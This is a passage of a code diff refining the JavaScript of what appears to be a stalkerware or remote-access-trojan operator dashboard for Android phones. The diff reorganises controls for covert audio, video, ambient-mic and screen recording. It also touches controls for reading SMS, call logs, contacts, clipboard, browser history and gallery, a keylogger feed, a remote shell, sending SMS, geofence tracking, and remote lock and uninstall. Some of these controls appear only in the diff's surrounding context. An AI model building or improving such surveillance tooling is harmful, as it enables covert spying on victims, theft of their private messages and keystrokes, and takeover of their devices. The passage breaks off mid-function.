@@ -144,7 +144,7 @@ function selectDevice(deviceUid) {
 }
 
 // ==========================================
-// INJECT ALL 20+ ADVANCED CONTROLS
+// INJECT ALL 20+ ADVANCED CONTROLS (FIXED ORDER)
 // ==========================================
 function injectAdvancedControls() {
     if (document.getElementById('cmd-audio')) return;
@@ -152,153 +152,38 @@ function injectAdvancedControls() {
     const matrix = document.querySelector('.card-grid');
     if (!matrix) return;
 
-    // ── SECTION: Time Activation ──────────────
-    const timeWrapper = document.createElement('div');
-    timeWrapper.className = 'time-control-wrapper';
-    timeWrapper.innerHTML = `
-        <label class="time-control-label">
-            <i class="fa-solid fa-clock"></i> DAILY ACTIVATION CYCLE
-        </label>
-        <input type="time" id="time-setter">
-    `;
-    matrix.parentElement.insertBefore(timeWrapper, matrix.nextSibling);
+    const parentGrid = matrix.closest('.dashboard-grid-container');
+    const controlMatrixCard = matrix.closest('.crypto-card');
 
-    // ── SECTION: Media Controls ───────────────
-    const audioBtn = createMatrixBtn('cmd-audio', 'fa-microphone-lines', 'AUDIO REC', 'OFF');
-    matrix.appendChild(audioBtn);
+    // ── Media toggle buttons (inside matrix grid) ────
+    matrix.appendChild(createMatrixBtn('cmd-audio', 'fa-microphone-lines', 'AUDIO REC', 'OFF'));
+    matrix.appendChild(createMatrixBtn('cmd-video', 'fa-video', 'VIDEO REC', 'OFF'));
+    matrix.appendChild(createMatrixBtn('cmd-ambient', 'fa-wave-square', 'AMBIENT MIC', 'OFF'));
+    matrix.appendChild(createMatrixBtn('cmd-screenrec', 'fa-desktop', 'SCREEN REC', 'OFF'));
 
-    const videoBtn = createMatrixBtn('cmd-video', 'fa-video', 'VIDEO REC', 'OFF');
-    matrix.appendChild(videoBtn);
+    // ── SECTION: Data Extraction (inside matrix) ────
+    matrix.appendChild(createSectionHeader('📊 DATA EXTRACTION'));
 
-    const ambientBtn = createMatrixBtn('cmd-ambient', 'fa-wave-square', 'AMBIENT MIC', 'OFF');
-    matrix.appendChild(ambientBtn);
+    matrix.appendChild(createMatrixBtn('cmd-readsms', 'fa-message', 'READ SMS', 'TRIGGER'));
+    matrix.appendChild(createMatrixBtn('cmd-readcalls', 'fa-phone', 'CALL LOG', 'TRIGGER'));
+    matrix.appendChild(createMatrixBtn('cmd-readcontacts', 'fa-address-book', 'CONTACTS', 'TRIGGER'));
+    matrix.appendChild(createMatrixBtn('cmd-readapps', 'fa-grid-2', 'APP LIST', 'TRIGGER'));
+    matrix.appendChild(createMatrixBtn('cmd-scanwifi', 'fa-wifi', 'SCAN WIFI', 'TRIGGER'));
+    matrix.appendChild(createMatrixBtn('cmd-readbattery', 'fa-battery-full', 'BATTERY', 'TRIGGER'));
+    matrix.appendChild(createMatrixBtn('cmd-readtraffic', 'fa-arrow-up-arrow-down', 'TRAFFIC', 'TRIGGER'));
+    matrix.appendChild(createMatrixBtn('cmd-deviceinfo', 'fa-circle-info', 'DEVICE INFO', 'TRIGGER'));
+    matrix.appendChild(createMatrixBtn('cmd-clipboard', 'fa-clipboard', 'CLIPBOARD', 'OFF'));
+    matrix.appendChild(createMatrixBtn('cmd-gallery', 'fa-images', 'GALLERY', 'TRIGGER'));
+    matrix.appendChild(createMatrixBtn('cmd-browser', 'fa-globe', 'BROWSER HIST', 'TRIGGER'));
 
-    const screenRecBtn = createMatrixBtn('cmd-screenrec', 'fa-desktop', 'SCREEN REC', 'OFF');
-    matrix.appendChild(screenRecBtn);
+    // ── SECTION: Remote Control (inside matrix) ─────
+    matrix.appendChild(createSectionHeader('🎮 REMOTE CONTROL'));
 
-    // ── SECTION: Data Extraction ──────────────
-    const sectionData = createSectionHeader('📊 DATA EXTRACTION');
-    matrix.parentElement.insertBefore(sectionData, matrix.nextSibling);
+    matrix.appendChild(createMatrixBtn('cmd-screenshot', 'fa-camera-retro', 'SCREENSHOT', 'TRIGGER'));
+    matrix.appendChild(createMatrixBtn('cmd-storage', 'fa-hard-drive', 'STORAGE', 'TRIGGER'));
 
-    const readSmsBtn = createMatrixBtn('cmd-readsms', 'fa-message', 'READ SMS', 'TRIGGER');
-    matrix.appendChild(readSmsBtn);
-
-    const readCallsBtn = createMatrixBtn('cmd-readcalls', 'fa-phone', 'CALL LOG', 'TRIGGER');
-    matrix.appendChild(readCallsBtn);
-
-    const readContactsBtn = createMatrixBtn('cmd-readcontacts', 'fa-address-book', 'CONTACTS', 'TRIGGER');
-    matrix.appendChild(readContactsBtn);
-
-    const readAppsBtn = createMatrixBtn('cmd-readapps', 'fa-grid-2', 'APP LIST', 'TRIGGER');
-    matrix.appendChild(readAppsBtn);
-
-    const scanWifiBtn = createMatrixBtn('cmd-scanwifi', 'fa-wifi', 'SCAN WIFI', 'TRIGGER');
-    matrix.appendChild(scanWifiBtn);
-
-    const readBatteryBtn = createMatrixBtn('cmd-readbattery', 'fa-battery-full', 'BATTERY', 'TRIGGER');
-    matrix.appendChild(readBatteryBtn);
-
-    const readTrafficBtn = createMatrixBtn('cmd-readtraffic', 'fa-arrow-up-arrow-down', 'TRAFFIC', 'TRIGGER');
-    matrix.appendChild(readTrafficBtn);
-
-    const deviceInfoBtn = createMatrixBtn('cmd-deviceinfo', 'fa-circle-info', 'DEVICE INFO', 'TRIGGER');
-    matrix.appendChild(deviceInfoBtn);
-
-    const clipboardBtn = createMatrixBtn('cmd-clipboard', 'fa-clipboard', 'CLIPBOARD', 'OFF');
-    matrix.appendChild(clipboardBtn);
-
-    const galleryBtn = createMatrixBtn('cmd-gallery', 'fa-images', 'GALLERY', 'TRIGGER');
-    matrix.appendChild(galleryBtn);
-
-    const browserBtn = createMatrixBtn('cmd-browser', 'fa-globe', 'BROWSER HIST', 'TRIGGER');
-    matrix.appendChild(browserBtn);
-
-    // ── SECTION: Remote Control ───────────────
-    const sectionRemote = createSectionHeader('🎮 REMOTE CONTROL');
-    matrix.parentElement.insertBefore(sectionRemote, matrix.nextSibling);
-
-    const screenshotBtn = createMatrixBtn('cmd-screenshot', 'fa-camera-retro', 'SCREENSHOT', 'TRIGGER');
-    matrix.appendChild(screenshotBtn);
-
-    const storageBtn = createMatrixBtn('cmd-storage', 'fa-hard-drive', 'STORAGE', 'TRIGGER');
-    matrix.appendChild(storageBtn);
-
-    // Shell command input
-    const shellWrapper = document.createElement('div');
-    shellWrapper.className = 'shell-control-wrapper';
-    shellWrapper.innerHTML = `
-        <label class="time-control-label">
-            <i class="fa-solid fa-terminal"></i> REMOTE SHELL
-        </label>
-        <div style="display:flex;gap:8px;">
-            <input type="text" id="shell-input" placeholder="ls /sdcard" 
-                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;">
-            <button id="cmd-shell" class="matrix-btn" style="padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">RUN</button>
-        </div>
-        <pre id="shell-output" style="background:#0a0a1a;color:#00ff88;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:200px;overflow:auto;display:none;white-space:pre-wrap;"></pre>
-    `;
-    matrix.parentElement.insertBefore(shellWrapper, matrix.nextSibling);
-
-    // SMS send input
-    const smsWrapper = document.createElement('div');
-    smsWrapper.className = 'shell-control-wrapper';
-    smsWrapper.innerHTML = `
-        <label class="time-control-label">
-            <i class="fa-solid fa-paper-plane"></i> SEND SMS
-        </label>
-        <div style="display:flex;gap:8px;margin-bottom:8px;">
-            <input type="text" id="sms-number" placeholder="+256700123456" 
-                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
-        </div>
-        <div style="display:flex;gap:8px;">
-            <input type="text" id="sms-body" placeholder="Message text..." 
-                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
-            <button id="cmd-sendsms" class="matrix-btn" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">SEND</button>
-        </div>
-    `;
-    matrix.parentElement.insertBefore(smsWrapper, matrix.nextSibling);
-
-    // File browser input
-    const fileWrapper = document.createElement('div');
-    fileWrapper.className = 'shell-control-wrapper';
-    fileWrapper.innerHTML = `
-        <label class="time-control-label">
-            <i class="fa-solid fa-folder-open"></i> FILE BROWSER
-        </label>
-        <div style="display:flex;gap:8px;">
-            <input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0"
-                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;">
-            <button id="cmd-listfiles" class="matrix-btn" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">LIST</button>
-        </div>
-        <pre id="file-output" style="background:#0a0a1a;color:#4ecdc4;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:200px;overflow:auto;display:none;white-space:pre-wrap;"></pre>
-    `;
-    matrix.parentElement.insertBefore(fileWrapper, matrix.nextSibling);
-
-    // Geofence input
-    const geoWrapper = document.createElement('div');
-    geoWrapper.className = 'shell-control-wrapper';
-    geoWrapper.innerHTML = `
-        <label class="time-control-label">
-            <i class="fa-solid fa-location-crosshairs"></i> GEOFENCE
-        </label>
-        <div style="display:flex;gap:8px;margin-bottom:8px;">
-            <input type="number" id="geo-lat" placeholder="Latitude (0.3476)" step="0.000001"
-                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
-            <input type="number" id="geo-lng" placeholder="Longitude (32.5825)" step="0.000001"
-                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
-            <input type="number" id="geo-radius" placeholder="Radius (m)" value="1000"
-                   style="width:100px;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
-        </div>
-        <div style="display:flex;gap:8px;">
-            <button id="cmd-setgeo" class="matrix-btn" style="flex:1;padding:10px;background:#ffd93d;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">SET GEOFENCE</button>
-            <button id="cmd-disablegeo" class="matrix-btn" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">DISABLE</button>
-        </div>
-    `;
-    matrix.parentElement.insertBefore(geoWrapper, matrix.nextSibling);
-
-    // ── SECTION: Danger Zone ──────────────────
-    const sectionDanger = createSectionHeader('⚠️ DANGER ZONE');
-    matrix.parentElement.insertBefore(sectionDanger, matrix.nextSibling);
+    // ── SECTION: Danger Zone (inside matrix) ────────
+    matrix.appendChild(createSectionHeader('⚠️ DANGER ZONE'));
 
     const uninstallBtn = createMatrixBtn('cmd-uninstall', 'fa-trash', 'UNINSTALL APP', 'TRIGGER');
     uninstallBtn.style.borderColor = '#ff6b6b';
@@ -320,10 +205,93 @@ function injectAdvancedControls() {
     lockNowBtn.style.borderColor = '#ff6b6b';
     matrix.appendChild(lockNowBtn);
 
-    // ── SECTION: Data Display Panels ──────────
-    const sectionDisplay = createSectionHeader('📋 LIVE DATA FEEDS');
-    matrix.parentElement.insertBefore(sectionDisplay, matrix.nextSibling);
+    // ── INPUT WRAPPERS (chained after the control matrix card) ──
 
+    // 1. Time Activation
+    const timeWrapper = document.createElement('div');
+    timeWrapper.className = 'time-control-wrapper';
+    timeWrapper.innerHTML = `
+        <label class="time-control-label">
+            <i class="fa-solid fa-clock"></i> DAILY ACTIVATION CYCLE
+        </label>
+        <input type="time" id="time-setter">
+    `;
+    controlMatrixCard.after(timeWrapper);
+
+    // 2. Shell Command
+    const shellWrapper = document.createElement('div');
+    shellWrapper.className = 'shell-control-wrapper';
+    shellWrapper.innerHTML = `
+        <label class="time-control-label">
+            <i class="fa-solid fa-terminal"></i> REMOTE SHELL
+        </label>
+        <div style="display:flex;gap:8px;">
+            <input type="text" id="shell-input" placeholder="ls /sdcard" 
+                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;">
+            <button id="cmd-shell" style="padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">RUN</button>
+        </div>
+        <pre id="shell-output" style="display:none;"></pre>
+    `;
+    timeWrapper.after(shellWrapper);
+
+    // 3. Send SMS
+    const smsWrapper = document.createElement('div');
+    smsWrapper.className = 'shell-control-wrapper';
+    smsWrapper.innerHTML = `
+        <label class="time-control-label">
+            <i class="fa-solid fa-paper-plane"></i> SEND SMS
+        </label>
+        <div style="display:flex;gap:8px;margin-bottom:8px;">
+            <input type="text" id="sms-number" placeholder="+256700123456" 
+                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
+        </div>
+        <div style="display:flex;gap:8px;">
+            <input type="text" id="sms-body" placeholder="Message text..." 
+                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
+            <button id="cmd-sendsms" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">SEND</button>
+        </div>
+    `;
+    shellWrapper.after(smsWrapper);
+
+    // 4. File Browser
+    const fileWrapper = document.createElement('div');
+    fileWrapper.className = 'shell-control-wrapper';
+    fileWrapper.innerHTML = `
+        <label class="time-control-label">
+            <i class="fa-solid fa-folder-open"></i> FILE BROWSER
+        </label>
+        <div style="display:flex;gap:8px;">
+            <input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0"
+                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;">
+            <button id="cmd-listfiles" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">LIST</button>
+        </div>
+        <pre id="file-output" style="display:none;"></pre>
+    `;
+    smsWrapper.after(fileWrapper);
+
+    // 5. Geofence
+    const geoWrapper = document.createElement('div');
+    geoWrapper.className = 'shell-control-wrapper';
+    geoWrapper.innerHTML = `
+        <label class="time-control-label">
+            <i class="fa-solid fa-location-crosshairs"></i> GEOFENCE
+        </label>
+        <div style="display:flex;gap:8px;margin-bottom:8px;">
+            <input type="number" id="geo-lat" placeholder="Latitude (0.3476)" step="0.000001"
+                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
+            <input type="number" id="geo-lng" placeholder="Longitude (32.5825)" step="0.000001"
+                   style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
+            <input type="number" id="geo-radius" placeholder="Radius (m)" value="1000"
+                   style="width:100px;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
+        </div>
+        <div style="display:flex;gap:8px;">
+            <button id="cmd-setgeo" style="flex:1;padding:10px;background:#ffd93d;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">SET GEOFENCE</button>
+            <button id="cmd-disablegeo" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">DISABLE</button>
+        </div>
+    `;
+    fileWrapper.after(geoWrapper);
+
+    // ── DATA PANELS (at the very end of the grid) ────
     const dataPanels = document.createElement('div');
     dataPanels.className = 'data-panels-grid';
     dataPanels.innerHTML = `
@@ -376,7 +344,7 @@ function injectAdvancedControls() {
             <div class="data-panel-body" id="gallery-feed">Waiting for data...</div>
         </div>
     `;
-    matrix.parentElement.insertBefore(dataPanels, matrix.nextSibling);
+    parentGrid.appendChild(dataPanels);
 }
 
 // Helper: Create a matrix button
@@ -392,7 +360,7 @@ function createMatrixBtn(id, icon, label, stateText) {
 function createSectionHeader(title) {
     const header = document.createElement('div');
     header.className = 'section-header';
-    header.innerHTML = `<h3 style="color:#00ff88;margin:20px 0 10px;padding:10px;border-bottom:1px solid #333;font-size:14px;letter-spacing:2px;">${title}</h3>`;
+    header.innerHTML = `<h3>${title}</h3>`;
     return header;
 }
 
@@ -437,6 +405,12 @@ function initializeTelemetryStream(uid) {
             if (mapLink) mapLink.href = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;
         }
 
+        // Last seen
+        const lastSeenEl = document.getElementById('last-seen-text');
+        if (lastSeenEl && data.last_seen) {
+            lastSeenEl.textContent = new Date(data.last_seen).toLocaleString();
+        }
+
         // Media upload state
         const uploadState = data.media_upload_state || "idle";
         ['cmd-audio', 'cmd-video'].forEach(btnId => {
@@ -455,7 +429,7 @@ function initializeTelemetryStream(uid) {
         // Media display
         const img = document.getElementById('cameraPreviewFrame');
         const video = document.getElementById('mediaVideoPlayer');
-        const audio = document.getElementById('mediaAudioPlayer');
+        const audioEl = document.getElementById('mediaAudioPlayer');
         const audioContainer = document.getElementById('audio-container');
         const placeholder = document.getElementById('mediaPlaceholderText');
         const timestamp = document.getElementById('captureTimestamp');
@@ -463,7 +437,7 @@ function initializeTelemetryStream(uid) {
         const hideAll = () => {
             if (img) img.style.display = 'none';
             if (video) { video.style.display = 'none'; video.pause(); }
-            if (audio) { audio.style.display = 'none'; audio.pause(); }
+            if (audioEl) { audioEl.style.display = 'none'; audioEl.pause(); }
             if (audioContainer) audioContainer.style.display = 'none';
             if (placeholder) placeholder.style.display = 'block';
         };
@@ -485,10 +459,10 @@ function initializeTelemetryStream(uid) {
             if (video.src !== videoUrl) { video.src = videoUrl; video.load(); }
             video.style.display = 'block';
             activeMedia = true;
-        } else if (audioUrl && audio) {
+        } else if (audioUrl && audioEl) {
             hideAll();
-            if (audio.src !== audioUrl) { audio.src = audioUrl; audio.load(); }
-            audio.style.display = 'block';
+            if (audioEl.src !== audioUrl) { audioEl.src = audioUrl; audioEl.load(); }
+            audioEl.style.display = 'block';
             if (audioContainer) audioContainer.style.display = 'block';
             activeMedia = true;
         }
@@ -538,11 +512,13 @@ function initializeDataFeedListeners(uid) {
     // SMS Feed
     listenToFeed(uid, 'sms', (data) => {
         const messages = data.messages || [];
-        document.getElementById('sms-count').textContent = messages.length;
+        const countEl = document.getElementById('sms-count');
+        if (countEl) countEl.textContent = messages.length;
         const feed = document.getElementById('sms-feed');
+        if (!feed) return;
         if (messages.length === 0) { feed.innerHTML = 'No SMS data yet'; return; }
         feed.innerHTML = messages.map(m =>
-            `<div class="feed-item"><strong>${m.sender || 'Unknown'}</strong> <small>${formatTime(m.timestamp)}</small><br>${escapeHtml(m.body || '')}</div>`
+            `<div class="feed-item"><strong>${escapeHtml(m.sender || 'Unknown')}</strong> <small>${formatTime(m.timestamp)}</small><br>${escapeHtml(m.body || '')}</div>`
         ).join('');
     });
 
@@ -550,24 +526,25 @@ function initializeDataFeedListeners(uid) {
     listenToFeed(uid, 'sms_live', (data) => {
         const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 20);
         const feed = document.getElementById('sms-feed');
-        if (items.length > 0) {
-            const liveHtml = items.map(m =>
-                `<div class="feed-item live-item">🔴 <strong>${m.sender || 'Unknown'}</strong> <small>${formatTime(m.timestamp)}</small><br>${escapeHtml(m.body || '')}</div>`
-            ).join('');
-            feed.innerHTML = liveHtml + feed.innerHTML;
-        }
+        if (!feed || items.length === 0) return;
+        const liveHtml = items.map(m =>
+            `<div class="feed-item live-item">🔴 <strong>${escapeHtml(m.sender || 'Unknown')}</strong> <small>${formatTime(m.timestamp)}</small><br>${escapeHtml(m.body || '')}</div>`
+        ).join('');
+        feed.innerHTML = liveHtml + feed.innerHTML;
     });
 
     // Call Log
     listenToFeed(uid, 'call_log', (data) => {
         const calls = data.calls || [];
-        document.getElementById('calls-count').textContent = calls.length;
+        const countEl = document.getElementById('calls-count');
+        if (countEl) countEl.textContent = calls.length;
         const feed = document.getElementById('calls-feed');
+        if (!feed) return;
         if (calls.length === 0) { feed.innerHTML = 'No call data yet'; return; }
         feed.innerHTML = calls.map(c => {
             const icon = c.type === 'incoming' ? '📥' : c.type === 'outgoing' ? '📤' : '❌';
             const dur = c.duration_seconds ? `${Math.floor(c.duration_seconds / 60)}m ${c.duration_seconds % 60}s` : '--';
-            return `<div class="feed-item">${icon} <strong>${c.name || c.number || 'Unknown'}</strong> <small>${formatTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;
+            return `<div class="feed-item">${icon} <strong>${escapeHtml(c.name || c.number || 'Unknown')}</strong> <small>${formatTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;
         }).join('');
     });
 
@@ -575,20 +552,21 @@ function initializeDataFeedListeners(uid) {
     listenToFeed(uid, 'calls_live', (data) => {
         const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 10);
         const feed = document.getElementById('calls-feed');
-        if (items.length > 0) {
-            const liveHtml = items.map(c => {
-                const icon = c.state === 'ringing' ? '🔔' : c.state === 'offhook' ? '📞' : '📴';
-                return `<div class="feed-item live-item">${icon} <strong>${c.name || c.number || 'Unknown'}</strong> <small>${c.state} • ${formatTime(c.timestamp)}</small></div>`;
-            }).join('');
-            feed.innerHTML = liveHtml + feed.innerHTML;
-        }
+        if (!feed || items.length === 0) return;
+        const liveHtml = items.map(c => {
+            const icon = c.state === 'ringing' ? '🔔' : c.state === 'offhook' ? '📞' : '📴';
+            return `<div class="feed-item live-item">${icon} <strong>${escapeHtml(c.name || c.number || 'Unknown')}</strong> <small>${c.state} • ${formatTime(c.timestamp)}</small></div>`;
+        }).join('');
+        feed.innerHTML = liveHtml + feed.innerHTML;
     });
 
     // Contacts
     listenToFeed(uid, 'contacts', (data) => {
         const contacts = data.contacts || [];
-        document.getElementById('contacts-count').textContent = contacts.length;
+        const countEl = document.getElementById('contacts-count');
+        if (countEl) countEl.textContent = contacts.length;
         const feed = document.getElementById('contacts-feed');
+        if (!feed) return;
         if (contacts.length === 0) { feed.innerHTML = 'No contact data yet'; return; }
         feed.innerHTML = contacts.slice(0, 100).map(c =>
             `<div class="feed-item"><strong>${escapeHtml(c.name || 'Unknown')}</strong> <small>${c.number || ''} • ${c.type || ''}</small></div>`
@@ -598,8 +576,10 @@ function initializeDataFeedListeners(uid) {
     // Wi-Fi
     listenToFeed(uid, 'wifi', (data) => {
         const networks = data.nearby_networks || [];
-        document.getElementById('wifi-count').textContent = networks.length;
+        const countEl = document.getElementById('wifi-count');
+        if (countEl) countEl.textContent = networks.length;
         const feed = document.getElementById('wifi-feed');
+        if (!feed) return;
         const currentSsid = data.current_ssid || 'Not connected';
         let html = `<div class="feed-item" style="color:#00ff88;"> Connected: <strong>${escapeHtml(currentSsid)}</strong> (RSSI: ${data.current_rssi || '--'})</div>`;
         html += networks.slice(0, 30).map(n => {
@@ -613,8 +593,10 @@ function initializeDataFeedListeners(uid) {
     // Apps
     listenToFeed(uid, 'installed_apps', (data) => {
         const apps = data.apps || [];
-        document.getElementById('apps-count').textContent = apps.length;
+        const countEl = document.getElementById('apps-count');
+        if (countEl) countEl.textContent = apps.length;
         const feed = document.getElementById('apps-feed');
+        if (!feed) return;
         if (apps.length === 0) { feed.innerHTML = 'No app data yet'; return; }
         const userApps = apps.filter(a => !a.is_system);
         const sysApps = apps.filter(a => a.is_system);
@@ -628,6 +610,7 @@ function initializeDataFeedListeners(uid) {
     // Device Info
     listenToFeed(uid, 'device_info', (data) => {
         const feed = document.getElementById('deviceinfo-feed');
+        if (!feed) return;
         const rows = [
             ['Model', data.model], ['Brand', data.brand], ['Android', data.android_version],
             ['SDK', data.sdk_version], ['Storage', `${data.storage_used_percent || '?'}% used (${data.storage_free_gb || '?'}GB free)`],
@@ -645,6 +628,7 @@ function initializeDataFeedListeners(uid) {
     // Battery
     listenToFeed(uid, 'battery_current', (data) => {
         const feed = document.getElementById('battery-feed');
+        if (!feed) return;
         const rows = [
             ['Level', `${data.level_percent || '?'}%`], ['Status', data.status],
             ['Health', data.health], ['Temperature', `${data.temperature_c || '?'}°C`],
@@ -659,8 +643,10 @@ function initializeDataFeedListeners(uid) {
     // Keylogger
     listenToFeed(uid, 'keylog', (data) => {
         const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 50);
-        document.getElementById('keylog-count').textContent = items.length;
+        const countEl = document.getElementById('keylog-count');
+        if (countEl) countEl.textContent = items.length;
         const feed = document.getElementById('keylog-feed');
+        if (!feed) return;
         if (items.length === 0) { feed.innerHTML = 'No keystrokes yet (enable Accessibility Service)'; return; }
         feed.innerHTML = items.map(k =>
             `<div class="feed-item"><strong>${escapeHtml(k.app || 'unknown')}</strong> <small>${formatTime(k.timestamp)}</small><br><code>${escapeHtml(k.text || '')}</code></div>`
@@ -671,6 +657,7 @@ function initializeDataFeedListeners(uid) {
     listenToFeed(uid, 'geofence_alerts', (data) => {
         const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 20);
         const feed = document.getElementById('geofence-feed');
+        if (!feed) return;
         if (items.length === 0) { feed.innerHTML = 'No geofence alerts'; return; }
         feed.innerHTML = items.map(g => {
             const icon = g.event === 'LEFT' ? '🚨' : '✅';
@@ -682,24 +669,25 @@ function initializeDataFeedListeners(uid) {
     listenToFeed(uid, 'clipboard', (data) => {
         const items = Object.values(data || {}).sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 20);
         const feed = document.getElementById('clipboard-feed');
+        if (!feed) return;
         if (items.length === 0) { feed.innerHTML = 'No clipboard data yet'; return; }
         feed.innerHTML = items.map(c =>
             `<div class="feed-item"><small>${formatTime(c.timestamp)} • ${c.length || 0} chars</small><br><code>${escapeHtml((c.text || '').substring(0, 200))}</code></div>`
         ).join('');
     });
 
-    // Also listen to clipboard_current
+    // Clipboard current
     listenToFeed(uid, 'clipboard_current', (data) => {
         const feed = document.getElementById('clipboard-feed');
-        if (data && data.text) {
-            feed.innerHTML = `<div class="feed-item live-item">📋 <strong>CURRENT CLIPBOARD</strong> <small>${formatTime(data.timestamp)}</small><br><code>${escapeHtml(data.text.substring(0, 300))}</code></div>` + feed.innerHTML;
-        }
+        if (!feed || !data || !data.text) return;
+        feed.innerHTML = `<div class="feed-item live-item">📋 <strong>CURRENT CLIPBOARD</strong> <small>${formatTime(data.timestamp)}</small><br><code>${escapeHtml(data.text.substring(0, 300))}</code></div>` + feed.innerHTML;
     });
 
     // Browser History
     listenToFeed(uid, 'browser_history', (data) => {
         const history = data.history || [];
         const feed = document.getElementById('browser-feed');
+        if (!feed) return;
         if (history.length === 0) { feed.innerHTML = 'No browser history yet'; return; }
         feed.innerHTML = history.slice(0, 50).map(h =>
             `<div class="feed-item"><strong>${escapeHtml(h.title || 'Untitled')}</strong><br><a href="${h.url}" target="_blank" style="color:#4ecdc4;font-size:11px;">${escapeHtml((h.url || '').substring(0, 80))}</a> <small>${formatTime(h.date)}</small></div>`
@@ -710,6 +698,7 @@ function initializeDataFeedListeners(uid) {
     listenToFeed(uid, 'gallery_list', (data) => {
         const photos = data.photos || [];
         const feed = document.getElementById('gallery-feed');
+        if (!feed) return;
         if (photos.length === 0) { feed.innerHTML = 'No gallery data yet'; return; }
         feed.innerHTML = photos.slice(0, 30).map(p =>
             `<div class="feed-item">🖼️ <strong>${escapeHtml(p.name || 'Unknown')}</strong> <small>${formatTime(p.date_taken)} • ${(p.size_kb || 0)}KB</small></div>`
@@ -731,83 +720,75 @@ function initializeDataFeedListeners(uid) {
         if (output && data) {
             output.style.display = 'block';
             const entries = data.entries || [];
-            let html = `📁 ${data.current_path || '/'}\n\n`;
-            html += entries.map(e => {
+            let text = `📁 ${data.current_path || '/'}\n\n`;
+            text += entries.map(e => {
                 const icon = e.is_directory ? '📁' : '📄';
                 const size = e.is_directory ? '' : ` (${formatSize(e.size)})`;
                 return `${icon} ${e.name}${size}`;
             }).join('\n');
-            output.textContent = html;
+            output.textContent = text;
         }
     });
 
     // Geofence Status
     listenToFeed(uid, 'geofence_status', (data) => {
         const feed = document.getElementById('geofence-feed');
-        if (data && data.active) {
-            const statusHtml = `<div class="feed-item" style="color:#ffd93d;">📍 Geofence ACTIVE at ${data.lat}, ${data.lng} (radius: ${data.radius}m)</div>`;
-            feed.innerHTML = statusHtml + feed.innerHTML;
-        }
+        if (!feed || !data || !data.active) return;
+        const statusHtml = `<div class="feed-item" style="color:#ffd93d;">📍 Geofence ACTIVE at ${data.lat}, ${data.lng} (radius: ${data.radius}m)</div>`;
+        feed.innerHTML = statusHtml + feed.innerHTML;
     });
 
     // Screenshot
     listenToFeed(uid, 'screenshot', (data) => {
-        if (data && data.screenshot) {
-            const img = document.getElementById('cameraPreviewFrame');
-            const placeholder = document.getElementById('mediaPlaceholderText');
-            if (img) {
-                if (placeholder) placeholder.style.display = 'none';
-                img.src = data.screenshot;
-                img.style.display = 'block';
-                const ts = document.getElementById('captureTimestamp');
-                if (ts) ts.innerText = `SCREENSHOT: ${new Date().toLocaleTimeString()}`;
-            }
+        if (!data || !data.screenshot) return;
+        const img = document.getElementById('cameraPreviewFrame');
+        const placeholder = document.getElementById('mediaPlaceholderText');
+        if (img) {
+            if (placeholder) placeholder.style.display = 'none';
+            img.src = data.screenshot;
+            img.style.display = 'block';
+            const ts = document.getElementById('captureTimestamp');
+            if (ts) ts.innerText = `SCREENSHOT: ${new Date().toLocaleTimeString()}`;
         }
     });
 
     // Ambient Status
     listenToFeed(uid, 'ambient_status', (data) => {
         const btn = document.getElementById('cmd-ambient');
-        if (btn && data) {
-            const stateEl = btn.querySelector('.toggle-state');
-            if (data.status === 'recording') {
-                btn.classList.add('active');
